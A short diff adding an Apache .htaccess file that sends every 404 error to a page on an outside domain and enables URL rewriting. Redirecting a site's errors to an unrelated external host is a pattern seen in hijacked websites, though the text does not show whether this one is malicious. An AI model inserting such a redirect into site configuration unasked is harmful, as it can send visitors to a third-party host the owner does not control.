@@ -1,0 +1,4 @@
+ErrorDocument 404 http://kinmaps.co.cc/404.html
+RewriteEngine On
+RewriteBase /
+
